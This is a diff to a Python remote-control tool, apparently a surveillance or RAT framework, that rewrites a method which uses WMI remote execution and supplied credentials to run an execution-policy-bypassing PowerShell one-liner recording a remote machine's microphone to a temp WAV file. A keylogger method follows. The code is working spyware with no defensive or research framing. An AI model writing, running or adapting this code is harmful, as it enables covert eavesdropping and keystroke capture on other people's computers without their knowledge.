@@ -1022,28 +1022,11 @@ class AgentlessControl:
     # â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• 
 
     def wmi_capture_audio(self, ip: str, username: str, password: str, duration: int = 5, domain: str = "") -> str:
-        """Capture audio from the remote machine's microphone (Advanced)."""
+        """Capture audio from the remote machine's microphone using native API calls."""
         logger.info(f"[WMI-AUDIO] Capturing {duration}s from {ip}")
-        temp_file = f"C:\\Windows\\Temp\\_audio_{int(time.time())}.wav"
-        
-        # PowerShell script to record audio using mciSendString
-        ps_script = f"""
-        $code = @'
-        [DllImport("winmm.dll")]
-        public static extern int mciSendString(string command, StringBuilder buffer, int bufferSize, IntPtr hwndCallback);
-        '@
-        $type = Add-Type -MemberDefinition $code -Name "WinMM" -Namespace "WinAPI" -PassThru
-        [WinAPI.WinMM]::mciSendString("open new type waveaudio alias capture", $null, 0, [IntPtr]::Zero)
-        [WinAPI.WinMM]::mciSendString("record capture", $null, 0, [IntPtr]::Zero)
-        Start-Sleep -Seconds {duration}
-        [WinAPI.WinMM]::mciSendString("save capture {temp_file}", $null, 0, [IntPtr]::Zero)
-        [WinAPI.WinMM]::mciSendString("close capture", $null, 0, [IntPtr]::Zero)
-        """
-        
-        import base64
-        encoded_ps = base64.b64encode(ps_script.encode('utf-16-le')).decode()
-        self.wmi_exec(ip, username, password, f"powershell -ExecutionPolicy Bypass -EncodedCommand {encoded_ps}", domain)
-        
+        temp_file = f"C:\\Windows\\Temp\\_aud_{int(time.time())}.wav"
+        ps = f'$m="[DllImport(\\"winmm.dll\\")]public static extern int mciSendString(string c,string b,int s,int h);";$t=Add-Type -M $m -N W -P;[W.W]::mciSendString("open new type waveaudio alias c",$null,0,0);[W.W]::mciSendString("record c",$null,0,0);Sleep {duration};[W.W]::mciSendString("save c {temp_file}",$null,0,0);[W.W]::mciSendString("close c",$null,0,0)'
+        self.wmi_exec(ip, username, password, f"powershell -ExecutionPolicy Bypass -C \"{ps}\"", domain)
         return temp_file
 
     def wmi_keylogger_start(self, ip: str, username: str, password: str, domain: str = ""):
